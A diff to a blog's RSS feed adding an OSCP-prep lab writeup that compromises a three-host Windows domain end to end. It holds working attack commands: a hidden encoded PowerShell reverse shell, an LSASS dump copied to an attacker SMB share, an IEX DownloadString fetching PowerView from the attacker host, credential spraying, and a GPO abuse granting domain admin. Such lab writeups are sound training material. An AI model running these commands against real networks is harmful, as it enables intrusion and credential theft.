@@ -4,9 +4,335 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Fri, 20 Mar 2026 18:50:15 GMT</lastBuildDate>
+        <lastBuildDate>Fri, 10 Apr 2026 19:35:08 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[OSCP Preparation - CHALLENGE_0 Secura - Writeup]]></title>
+            <guid>9d3cde14f592486ab24e3235f017c1c2</guid>
+            <pubDate>Fri, 10 Apr 2026 17:04:51 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="challenge-0-offsec-writeup">Challenge 0 — OffSec Writeup</h1>
+<p><strong>Date:</strong> 2026-04-10<br />
+<strong>Lab:</strong> OffSec Challenge Lab 0 (OSCP prep)<br />
+<strong>Forest:</strong> secura.yzx<br />
+<strong>Targets:</strong> 192.168.224.95 (SECURE), 192.168.224.96 (ERA), 192.168.224.97 (DC01)<br />
+<strong>Difficulty:</strong> Easy/Medium<br />
+<strong>OS:</strong> Windows 10 + Windows Server (AD DS)</p>
+<hr />
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li><a title="#reconnaissance" href="#reconnaissance">Reconnaissance</a></li>
+<li><a title="#foothold--manageengine-default-creds--script-monitor-rce" href="#foothold--manageengine-default-creds--script-monitor-rce">Foothold - ManageEngine Default Creds + Script Monitor RCE</a></li>
+<li><a title="#credential-harvesting--lsass-dump-via-comsvcsdll" href="#credential-harvesting--lsass-dump-via-comsvcsdll">Credential Harvesting - LSASS Dump via comsvcs.dll</a></li>
+<li><a title="#lateral-movement--secure--era" href="#lateral-movement--secure--era">Lateral Movement - SECURE to ERA</a></li>
+<li><a title="#privilege-escalation--apache--administrator-on-era" href="#privilege-escalation--apache--administrator-on-era">Privilege Escalation - apache to administrator on ERA</a></li>
+<li><a title="#lateral-movement--era--dc01" href="#lateral-movement--era--dc01">Lateral Movement - ERA to DC01</a></li>
+<li><a title="#privilege-escalation--charlotte--domain-admin-via-gpo-abuse" href="#privilege-escalation--charlotte--domain-admin-via-gpo-abuse">Privilege Escalation - charlotte to Domain Admin via GPO Abuse</a></li>
+<li><a title="#vulnerability-summary" href="#vulnerability-summary">Vulnerability Summary</a></li>
+<li><a title="#kill-chain" href="#kill-chain">Kill Chain</a></li>
+</ul>
+<hr />
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>Host discovery on the in-scope /24:</p>
+<div><pre class="hljs"><code>nmap -sn 192.168.224.0/24</code></pre></div>
+<p>Three live hosts (+ gateway):</p>
+<ul>
+<li><strong>192.168.224.95</strong> — Windows 10, domain-joined (SECURE.secura.yzx)</li>
+<li><strong>192.168.224.96</strong> — Windows Server (ERA)</li>
+<li><strong>192.168.224.97</strong> — Windows Server 2016, AD DS (DC01.secura.yzx)</li>
+</ul>
+<p>Service enumeration on SECURE:</p>
+<div><pre class="hljs"><code>nmap -p- --min-rate 2000 192.168.224.95
+nmap -sVC -p 5001,8443,12000,44444 192.168.224.95</code></pre></div>
+<p>Key finding: <strong>ManageEngine Applications Manager</strong> listening on <code>8443/tcp</code> (HTTPS), build 14710 Free Edition.</p>
+<hr />
+<h2 id="foothold-manageengine-default-creds-script-monitor-rce">Foothold — ManageEngine Default Creds + Script Monitor RCE</h2>
+<h3 id="1-default-credentials">1. Default Credentials</h3>
+<p>Browsing to <code>https://192.168.224.95:8443/</code> exposes the AppManager login page. Default credentials work out of the box:</p>
+<div><pre class="hljs"><code><span class="hljs-literal">admin</span> : <span class="hljs-literal">admin</span></code></pre></div>
+<p>The About page confirms build <strong>14710</strong> (Free Edition), installation path <code>C:\Program Files\ManageEngine\AppManager14</code>, PostgreSQL backend.</p>
+<h3 id="2-script-monitor-abuse">2. Script Monitor Abuse</h3>
+<p>AppManager has a native <strong>Script Monitor</strong> feature that lets admins run arbitrary commands on the monitoring host. Since the AppManager service runs as <strong>LocalSystem</strong>, any command executed through this feature inherits SYSTEM privileges.</p>
+<p><strong>New Monitor → Script Monitor</strong> configuration:</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">Script</span> Location:      <span class="hljs-keyword">Local</span> Server
+<span class="hljs-keyword">Script</span> <span class="hljs-keyword">Type</span>:          Command
+<span class="hljs-keyword">Script</span> / Command:     C:\Windows\System32\WindowsPowerShell\v1<span class="hljs-number">.0</span>\powershell.exe
+Execution Directory:  C:\Windows\Temp
+<span class="hljs-keyword">Arguments</span>:            -nop -w hidden -enc &lt;base64 UTF<span class="hljs-number">-16</span>LE reverse shell&gt;</code></pre></div>
+<h3 id="3-reverse-shell-as-system">3. Reverse Shell as SYSTEM</h3>
+<div><pre class="hljs"><code>nc -lvnp 9001</code></pre></div>
+<p>Triggering "Poll Now" on the newly created monitor:</p>
+<div><pre class="hljs"><code>listening on <span class="hljs-selector-attr">[any]</span> <span class="hljs-number">9001</span> ...
+connect <span class="hljs-selector-tag">to</span> <span class="hljs-selector-attr">[192.168.45.230]</span> <span class="hljs-selector-tag">from</span> (UNKNOWN) <span class="hljs-selector-attr">[192.168.224.95]</span> <span class="hljs-number">61570</span>
+PS C:\Windows\Temp&gt; whoami
+nt authority\system</code></pre></div>
+<h3 id="4-first-flag">4. First Flag</h3>
+<div><pre class="hljs"><code><span class="hljs-built_in">PS</span>&gt; <span class="hljs-built_in">type</span> C:\Users\Administrator\Desktop\proof.txt
+[<span class="hljs-type">REDACTED</span>]</code></pre></div>
+<p><strong>SECURE <code>proof.txt</code> obtained.</strong> No <code>local.txt</code> present — foothold went straight to SYSTEM, bypassing any low-priv user context.</p>
+<hr />
+<h2 id="credential-harvesting-lsass-dump-via-comsvcsdll">Credential Harvesting — LSASS Dump via comsvcs.dll</h2>
+<p>As SYSTEM, LSASS is dumpable via the Windows LOLBIN <code>comsvcs.dll</code> (built-in, signed, not flagged by Defender).</p>
+<h3 id="5-dump-lsass">5. Dump LSASS</h3>
+<div><pre class="hljs"><code><span class="hljs-built_in">PS</span>&gt; <span class="hljs-built_in">Get-Process</span> lsass | <span class="hljs-built_in">Select-Object</span> Id
+  Id
+  <span class="hljs-literal">--</span>
+ <span class="hljs-number">684</span>
+
+<span class="hljs-built_in">PS</span>&gt; rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <span class="hljs-number">684</span> C:\Windows\Temp\lsass.dmp full
+<span class="hljs-built_in">PS</span>&gt; <span class="hljs-built_in">dir</span> C:\Windows\Temp\lsass.dmp
+<span class="hljs-literal">-a----</span>  <span class="hljs-number">4</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2026</span>  <span class="hljs-number">3</span>:<span class="hljs-number">40</span> PM  <span class="hljs-number">54642962</span>  lsass.dmp</code></pre></div>
+<h3 id="6-exfiltration-via-impacket-smbserver">6. Exfiltration via impacket-smbserver</h3>
+<div><pre class="hljs"><code><span class="hljs-comment"># Kali</span>
+mkdir /tmp/share &amp;&amp; <span class="hljs-built_in">cd</span> /tmp/share
+impacket-smbserver -smb2support share .</code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-comment"># SECURE</span>
+<span class="hljs-built_in">copy</span> C:\Windows\Temp\lsass.dmp \\<span class="hljs-number">192.168</span>.<span class="hljs-number">45.230</span>\share\</code></pre></div>
+<h3 id="7-offline-parsing-with-pypykatz">7. Offline Parsing with pypykatz</h3>
+<div><pre class="hljs"><code>pypykatz lsa minidump lsass.dmp</code></pre></div>
+<p>Extracted credentials:</p>
+<ul>
+<li><code>SECURE\Administrator</code> NT hash</li>
+<li><code>SECURE$</code> machine account NT + Kerberos AES256 keys</li>
+<li>⭐ <strong>Credential Manager entry</strong>: <code>apache : [REDACTED]</code> (target label <code>era.secura.local</code>)</li>
+</ul>
+<p>The CredMan entry is the "plaintext password via RCE" announced by the lab. The target label <code>era.secura.local</code> is just a textual hint pointing at the box named <strong>ERA</strong>.</p>
+<hr />
+<h2 id="lateral-movement-secure-era">Lateral Movement — SECURE → ERA</h2>
+<h3 id="8-auth-scoping">8. Auth Scoping</h3>
+<div><pre class="hljs"><code><span class="hljs-comment"># Domain auth fails</span>
+netexec smb 192.168.224.96 -u apache -p <span class="hljs-string">'[REDACTED]'</span>
+<span class="hljs-comment"># STATUS_LOGON_FAILURE (secura.yzx\apache)</span>
+
+<span class="hljs-comment"># Local auth succeeds</span>
+netexec smb   192.168.224.96 -u apache -p <span class="hljs-string">'[REDACTED]'</span> --local-auth
+<span class="hljs-comment"># [+] ERA\apache</span>
+netexec winrm 192.168.224.96 -u apache -p <span class="hljs-string">'[REDACTED]'</span> --local-auth
+<span class="hljs-comment"># [+] ERA\apache (Pwn3d!)</span></code></pre></div>
+<p><code>apache</code> is a <strong>local</strong> account on ERA with WinRM access (via <code>BUILTIN\Remote Management Users</code>).</p>
+<h3 id="9-interactive-shell">9. Interactive Shell</h3>
+<div><pre class="hljs"><code>evil-winrm -i 192.168.224.96 -u apache -p <span class="hljs-string">'[REDACTED]'</span></code></pre></div>
+<p><code>whoami /all</code> reveals low-priv context: Medium IL, no <code>SeImpersonate</code> / <code>SeDebug</code> / <code>SeAssignPrimaryToken</code>. The <code>Pwn3d!</code> label from netexec only means WinRM admin access — not real local admin. No Potato family applicable.</p>
+<hr />
+<h2 id="privilege-escalation-apache-administrator-on-era">Privilege Escalation — apache → administrator on ERA</h2>
+<h3 id="10-service-inventory">10. Service Inventory</h3>
+<div><pre class="hljs"><code><span class="hljs-built_in">Get-Process</span> | <span class="hljs-built_in">Where-Object</span> { <span class="hljs-variable">$_</span>.ProcessName <span class="hljs-operator">-match</span> <span class="hljs-string">'mysql|httpd|xampp'</span> }</code></pre></div>
+<p>ERA has a full <strong>XAMPP</strong> installation at <code>C:\xampp\</code>:</p>
+<ul>
+<li>MariaDB <code>mysqld</code> running on <code>0.0.0.0:3306</code></li>
+<li>Apache not running, <code>htdocs</code> empty</li>
+</ul>
+<p>MariaDB from Kali fails with <code>ERROR 1130 Host not allowed to connect</code> (grant host filter). Access must come from a local client.</p>
+<h3 id="11-mariadb-access-via-xampp-default-creds">11. MariaDB Access via XAMPP Default Creds</h3>
+<p>Using the local <code>C:\xampp\mysql\bin\mysql.exe</code> client from the WinRM shell:</p>
+<div><pre class="hljs"><code>apache : [<span class="hljs-type">REDACTED</span>] → denied
+root   : (<span class="hljs-type">blank</span>)    → ✅</code></pre></div>
+<p>XAMPP's default <code>root</code> account has <strong>no password</strong>.</p>
+<h3 id="12-credential-dump-from-credscreds">12. Credential Dump from <code>creds.creds</code></h3>
+<div><pre class="hljs"><code><span class="hljs-keyword">SHOW</span> DATABASES;
+<span class="hljs-comment">-- creds, information_schema, mysql, performance_schema, phpmyadmin, test</span>
+
+USE creds; <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> creds;
+<span class="hljs-operator">+</span><span class="hljs-comment">---------------+-----------------+</span>
+<span class="hljs-operator">|</span> name          <span class="hljs-operator">|</span> pass            <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">---------------+-----------------+</span>
+<span class="hljs-operator">|</span> administrator <span class="hljs-operator">|</span> [REDACTED]      <span class="hljs-operator">|</span>
+<span class="hljs-operator">|</span> charlotte     <span class="hljs-operator">|</span> [REDACTED]      <span class="hljs-operator">|</span>
+<span class="hljs-operator">+</span><span class="hljs-comment">---------------+-----------------+</span></code></pre></div>
+<h3 id="13-credential-spraying">13. Credential Spraying</h3>
+<p>Parallel spray via bash background jobs against SECURE, ERA, DC01 on SMB/WinRM/LDAP. Results saved to <code>Evidence/Scans/AD Enumeration/spray_results.txt</code>:</p>
+<ul>
+<li><strong><code>ERA\administrator : [REDACTED]</code></strong> → local admin on ERA (SMB [+], WinRM [+] Pwn3d!)</li>
+<li><strong><code>secura.yzx\charlotte : [REDACTED]</code></strong> → valid domain user, WinRM Pwn3d! on DC01</li>
+<li><code>administrator</code> → fails on SECURE and on the domain</li>
+<li><code>charlotte</code> → not a local user anywhere</li>
+</ul>
+<h3 id="14-era-flags">14. ERA Flags</h3>
+<div><pre class="hljs"><code>evil-winrm -i 192.168.224.96 -u administrator -p <span class="hljs-string">'[REDACTED]'</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-built_in">PS</span>&gt; <span class="hljs-built_in">type</span> C:\Users\Administrator\Desktop\proof.txt
+[<span class="hljs-type">REDACTED</span>]
+<span class="hljs-built_in">PS</span>&gt; <span class="hljs-built_in">type</span> C:\Users\apache\Desktop\local.txt
+[<span class="hljs-type">REDACTED</span>]</code></pre></div>
+<p><strong>ERA <code>proof.txt</code> and <code>local.txt</code> obtained.</strong> Note: <code>local.txt</code> lives in the <em>domain user</em> <code>apache</code> profile (<code>C:\Users\apache\</code>), not the local <code>apache.ERA</code> profile — confirming two different SIDs with the same sAMAccountName.</p>
+<hr />
+<h2 id="lateral-movement-era-dc01">Lateral Movement — ERA → DC01</h2>
+<h3 id="15-winrm-as-charlotte">15. WinRM as charlotte</h3>
+<div><pre class="hljs"><code>evil-winrm -i 192.168.224.97 -u charlotte -p <span class="hljs-string">'[REDACTED]'</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-attr">User:</span>  <span class="hljs-string">secura\charlotte</span>
+<span class="hljs-attr">Groups:</span> <span class="hljs-string">BUILTIN\Remote</span> <span class="hljs-string">Management</span> <span class="hljs-string">Users,</span> <span class="hljs-string">BUILTIN\Pre-Windows</span> <span class="hljs-number">2000 </span><span class="hljs-string">Compatible</span> <span class="hljs-string">Access</span>
+<span class="hljs-attr">Privs:</span>  <span class="hljs-string">SeMachineAccountPrivilege,</span> <span class="hljs-string">SeImpersonatePrivilege</span>
+<span class="hljs-attr">IL:</span>     <span class="hljs-string">High</span></code></pre></div>
+<p>charlotte has WinRM access to the DC and <code>SeImpersonatePrivilege</code>, but is <strong>not</strong> a member of Administrators yet — initially only a domain user with RemoteShell rights.</p>
+<h3 id="16-dc-local-flag">16. DC Local Flag</h3>
+<div><pre class="hljs"><code><span class="hljs-built_in">PS</span>&gt; <span class="hljs-built_in">type</span> C:\Users\charlotte\Desktop\local.txt
+[<span class="hljs-type">REDACTED</span>]</code></pre></div>
+<p><strong>DC01 <code>local.txt</code> obtained.</strong> <code>C:\Users\Administrator\Desktop\proof.txt</code> is <strong>access denied</strong> — privilege escalation required.</p>
+<hr />
+<h2 id="privilege-escalation-charlotte-domain-admin-via-gpo-abuse">Privilege Escalation — charlotte → Domain Admin via GPO Abuse</h2>
+<h3 id="17-gpo-enumeration-with-powerview">17. GPO Enumeration with PowerView</h3>
+<p>PowerView loaded in-memory over HTTP from the Kali attacker:</p>
+<div><pre class="hljs"><code><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">'http://192.168.45.230/PowerView.ps1'</span>)
+
+<span class="hljs-built_in">Get-DomainGPO</span> | <span class="hljs-built_in">ForEach-Object</span> {
+    <span class="hljs-built_in">Get-DomainObjectAcl</span> <span class="hljs-literal">-ResolveGUIDs</span> <span class="hljs-literal">-Identity</span> <span class="hljs-variable">$_</span>.Name |
+      <span class="hljs-built_in">Where-Object</span> { <span class="hljs-variable">$_</span>.SecurityIdentifier <span class="hljs-operator">-match</span> <span class="hljs-string">'S-1-5-21-.*-1104'</span> }
+}</code></pre></div>
+<p>Result: the <strong>Default Domain Policy</strong> (GUID <code>{31B2F340-016D-11D2-945F-00C04FB984F9}</code>) has an explicit ACE granting charlotte (SID <code>...-1104</code>) the rights <strong><code>WriteDacl, WriteOwner, WriteProperty, GenericExecute</code></strong>.</p>
+<p>This is the misconfiguration: Default Domain Policy is linked to the domain root, which means it applies to the DC itself — any code injected into this GPO runs as SYSTEM on the DC at next <code>gpupdate</code>.</p>
+<h3 id="18-failed-sharpgpoabuse-attempts">18. Failed SharpGPOAbuse Attempts</h3>
+<p>First tried <code>--AddComputerTask</code> (immediate scheduled task injection):</p>
+<div><pre class="hljs"><code>.\SharpGPOAbuse.exe <span class="hljs-literal">--AddComputerTask</span> `
+  <span class="hljs-literal">--TaskName</span> <span class="hljs-string">"Update"</span> `
+  <span class="hljs-literal">--Author</span> <span class="hljs-string">"secura.yzx\Administrator"</span> `
+  <span class="hljs-literal">--Command</span> <span class="hljs-string">"cmd.exe"</span> `
+  <span class="hljs-literal">--Arguments</span> <span class="hljs-string">'/c net group "Domain Admins" charlotte /add /domain'</span> `
+  <span class="hljs-literal">--GPOName</span> <span class="hljs-string">"Default Domain Policy"</span></code></pre></div>
+<p>GPO was modified successfully, but PowerShell's argument tokenizer in WinRM stripped the inner quotes and the resulting <code>ScheduledTasks.xml</code> contained:</p>
+<div><pre class="hljs"><code><span class="hljs-tag">&lt;<span class="hljs-name">Arguments</span>&gt;</span>/c net group Domain<span class="hljs-tag">&lt;/<span class="hljs-name">Arguments</span>&gt;</span></code></pre></div>
+<p>→ truncated at the space, invalid command.</p>
+<p>Retried with <code>-EncodedCommand &lt;base64 UTF-16LE&gt;</code> to avoid quote issues:</p>
+<div><pre class="hljs"><code>[!] <span class="hljs-symbol">Unknown</span> argument error.
+[!] <span class="hljs-symbol">Exiting</span>...</code></pre></div>
+<p>SharpGPOAbuse's own argument parser interprets the leading <code>-</code> in <code>-EncodedCommand</code> (inside the Arguments value) as a new CLI flag. Dead end.</p>
+<h3 id="19-addlocaladmin-clean-approach">19. <code>--AddLocalAdmin</code> (Clean Approach)</h3>
+<p>Pivot to the cleaner mode: add charlotte to <strong>Restricted Groups</strong> → BUILTIN\Administrators. No shell-quoting, no encoding.</p>
+<div><pre class="hljs"><code>.\SharpGPOAbuse.exe <span class="hljs-literal">--AddLocalAdmin</span> `
+  <span class="hljs-literal">--UserAccount</span> charlotte `
+  <span class="hljs-literal">--GPOName</span> <span class="hljs-string">"Default Domain Policy"</span></code></pre></div>
+<div><pre class="hljs"><code>[+] <span class="hljs-symbol">SID</span> <span class="hljs-symbol">Value</span> of charlotte = <span class="hljs-symbol">S</span><span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-3453094141</span><span class="hljs-number">-4163309614</span><span class="hljs-number">-2941200192</span><span class="hljs-number">-1104</span>
+[+] <span class="hljs-symbol">GUID</span> of <span class="hljs-string">"Default Domain Policy"</span> is: {<span class="hljs-number">31</span><span class="hljs-symbol">B2F340</span><span class="hljs-number">-016</span><span class="hljs-symbol">D</span><span class="hljs-number">-11</span><span class="hljs-symbol">D2</span><span class="hljs-number">-945</span><span class="hljs-symbol">F</span><span class="hljs-number">-00</span><span class="hljs-symbol">C04FB984F9</span>}
+[+] <span class="hljs-symbol">File</span> exists: \\secura.yzx\<span class="hljs-symbol">SysVol</span>\secura.yzx\<span class="hljs-symbol">Policies</span>\{<span class="hljs-number">31</span><span class="hljs-symbol">B2F340</span>-...}\<span class="hljs-symbol">Machine</span>\<span class="hljs-symbol">Microsoft</span>\<span class="hljs-symbol">Windows</span> <span class="hljs-symbol">NT</span>\<span class="hljs-symbol">SecEdit</span>\<span class="hljs-symbol">GptTmpl</span>.inf
+[+] <span class="hljs-symbol">The</span> <span class="hljs-symbol">GPO</span> does not specify any group memberships.
+[+] versionNumber attribute changed successfully
+[+] <span class="hljs-symbol">The</span> version number in <span class="hljs-symbol">GPT</span>.ini was increased successfully.
+[+] <span class="hljs-symbol">The</span> <span class="hljs-symbol">GPO</span> was modified to include a new local admin. <span class="hljs-symbol">Wait</span> for the <span class="hljs-symbol">GPO</span> refresh cycle.</code></pre></div>
+<p>SharpGPOAbuse patched <code>GptTmpl.inf</code> in SysVol adding charlotte to the <code>[Group Membership]</code> section as a member of <code>*S-1-5-32-544</code> (BUILTIN\Administrators).</p>
+<h3 id="20-force-policy-refresh">20. Force Policy Refresh</h3>
+<div><pre class="hljs"><code>gpupdate /force
+<span class="hljs-comment"># Computer Policy update has completed successfully.</span>
+<span class="hljs-comment"># User Policy update has completed successfully.</span></code></pre></div>
+<p><strong>Key insight</strong>: on a Domain Controller, <code>BUILTIN\Administrators</code> is the effective Domain Admin group (DCSync rights, NTDS.dit access, full filesystem, interactive logon). Adding a user here is equivalent to making them DA — without ever touching the <code>Domain Admins</code> group.</p>
+<h3 id="21-re-login-elevated-token">21. Re-login → Elevated Token</h3>
+<p>Disconnect and reconnect via evil-winrm to get a fresh Kerberos token with the new group membership:</p>
+<div><pre class="hljs"><code>evil-winrm -i 192.168.224.97 -u charlotte -p <span class="hljs-string">'[REDACTED]'</span></code></pre></div>
+<div><pre class="hljs"><code><span class="hljs-keyword">USER</span> <span class="hljs-title">INFORMATION</span>: secura\charlotte
+
+<span class="hljs-keyword">GROUP</span> <span class="hljs-title">INFORMATION</span>:
+  BUILTIN\Administrators                     S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">544</span>   (<span class="hljs-keyword">Group</span> <span class="hljs-title">owner</span>)
+  BUILTIN\Remote Management Users
+  BUILTIN\Pre-Windows <span class="hljs-number">2000</span> Compatible Access
+  Mandatory Label\High Mandatory Level
+
+PRIVILEGES:
+  SeDebugPrivilege, SeBackupPrivilege, SeRestorePrivilege,
+  SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege,
+  SeSecurityPrivilege, SeSystemEnvironmentPrivilege, SeEnableDelegationPrivilege,
+  SeManageVolumePrivilege, ...</code></pre></div>
+<p>Full SYSTEM-tier privilege set on the DC.</p>
+<h3 id="22-final-flag">22. Final Flag</h3>
+<div><pre class="hljs"><code><span class="hljs-built_in">PS</span> C:\Users&gt; <span class="hljs-built_in">dir</span>
+Mode   Name
+<span class="hljs-literal">----</span>   <span class="hljs-literal">----</span>
+d<span class="hljs-literal">-----</span> Administrator.DC01      ← profile created pre<span class="hljs-literal">-domain-join</span>
+d<span class="hljs-literal">-----</span> charlotte
+d<span class="hljs-literal">-r---</span> Public
+d<span class="hljs-literal">-----</span> TEMP
+
+<span class="hljs-built_in">PS</span> C:\Users&gt; <span class="hljs-built_in">type</span> C:\Users\Administrator.DC01\Desktop\proof.txt
+[<span class="hljs-type">REDACTED</span>]</code></pre></div>
+<p><strong>DC01 <code>proof.txt</code> obtained.</strong></p>
+<p>The profile suffix <code>.DC01</code> is a forensic artifact: the Administrator profile on disk was created when the server was still standalone (hostname DC01), <em>before</em> being promoted to a Domain Controller. After promotion, the <code>Administrator</code> user became the domain account, but the legacy local profile directory retained its hostname suffix. Hence <code>Administrator.DC01</code> instead of the usual <code>Administrator</code>.</p>
+<hr />
+<h2 id="vulnerability-summary">Vulnerability Summary</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Vulnerability</th>
+<th>CVE</th>
+<th>Impact</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>ManageEngine AppManager default credentials (<code>admin:admin</code>)</td>
+<td>-</td>
+<td>Web console access</td>
+</tr>
+<tr>
+<td>2</td>
+<td>AppManager Script Monitor arbitrary command execution as LocalSystem</td>
+<td>-</td>
+<td>RCE as SYSTEM on SECURE</td>
+</tr>
+<tr>
+<td>3</td>
+<td>LSASS accessible to SYSTEM + cleartext CredMan storage</td>
+<td>-</td>
+<td>Recovery of <code>apache</code> plaintext password</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Reused local credentials across domain-joined host</td>
+<td>-</td>
+<td>Lateral movement SECURE → ERA</td>
+</tr>
+<tr>
+<td>5</td>
+<td>XAMPP MariaDB default <code>root</code> with blank password</td>
+<td>-</td>
+<td>Local database access on ERA</td>
+</tr>
+<tr>
+<td>6</td>
+<td>Plaintext credential storage in application DB (<code>creds.creds</code>)</td>
+<td>-</td>
+<td>Discovery of <code>administrator</code> + <code>charlotte</code> creds</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Insecure DACL on Default Domain Policy — <code>WriteDacl</code> granted to low-priv user</td>
+<td>-</td>
+<td>GPO-based privilege escalation to Domain Admin</td>
+</tr>
+<tr>
+<td>8</td>
+<td>GPO Restricted Groups abuse via SharpGPOAbuse</td>
+<td>-</td>
+<td>Persistence as <code>BUILTIN\Administrators</code> on DC</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kill-chain">Kill Chain</h2>
+<div><pre class="hljs"><code> secura.yzx forest
+    │
+    ├─[<span class="hljs-number">1</span>] SECURE (<span class="hljs-number">.95</span>) Win10 <span class="hljs-keyword">domain</span>-joined
+    │       └─ ManageEngine AppManager <span class="hljs-number">8443</span> — <span class="hljs-keyword">default</span> creds <span class="hljs-keyword">admin</span>:<span class="hljs-keyword">admin</span>
+    │            └─ Script Monitor (PowerShell -enc) → <span class="hljs-keyword">reverse</span> shell <span class="hljs-keyword">as</span> <span class="hljs-keyword">SYSTEM</span>
+    │                 ├─ proof.txt  [REDACTED]
+    │                 └─ LSASS dump (comsvcs.dll MiniDump) → pypykatz
+    │                      ├─ SECURE\<span class="hljs-keyword">Admin</span> NT hash
+    │                      └─ ⭐ CredMan: apache : [REDACTED]
+    │
+    ├─[<span class="hljs-number">2</span>] ERA (<span class="hljs-number">.96</span>) XAMPP + MariaDB
+    │       └─ netexec <span class="hljs-comment">--local-auth apache → WinRM (low-priv)</span>
+    │            └─ MariaDB: XAMPP root blank <span class="hljs-keyword">password</span>
+    │                 └─ Dump creds.creds
+    │                      ├─ administrator : [REDACTED] → <span class="hljs-keyword">local</span> <span class="hljs-keyword">admin</span> ERA
+    │                      │     ├─ proof.txt  [REDACTED]
+    │                      │     └─ <span class="hljs-keyword">local</span>.txt  [REDACTED]
+    │                      └─ ⭐ charlotte    : [REDACTED] → <span class="hljs-keyword">domain</span> <span class="hljs-keyword">user</span> + WinRM <span class="hljs-keyword">on</span> DC
+    │
+    └─[<span class="hljs-number">3</span>] DC01 (<span class="hljs-number">.97</span>) secura.yzx <span class="hljs-keyword">Domain</span> Controller
+            └─ WinRM <span class="hljs-keyword">as</span> charlotte (BUILTIN\Remote Management Users)
+                 ├─ <span class="hljs-keyword">local</span>.txt [REDACTED]
+                 └─ PowerView → WriteDacl <span class="hljs-keyword">on</span> <span class="hljs-keyword">Default</span> <span class="hljs-keyword">Domain</span> <span class="hljs-keyword">Policy</span> granted <span class="hljs-keyword">to</span> charlotte
+                      └─ SharpGPOAbuse <span class="hljs-comment">--AddLocalAdmin → GptTmpl.inf Restricted Groups</span>
+                           └─ gpupdate /force → BUILTIN\Administrators <span class="hljs-keyword">on</span> DC
+                                └─ proof.txt [REDACTED]  ☠️ <span class="hljs-keyword">DOMAIN</span> <span class="hljs-keyword">ADMIN</span></code></pre></div>
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[AI Won't Steal Your Job, Private Equity Will]]></title>
             <guid>0a0271a9288b43a7b16b065f0d3e5702</guid>
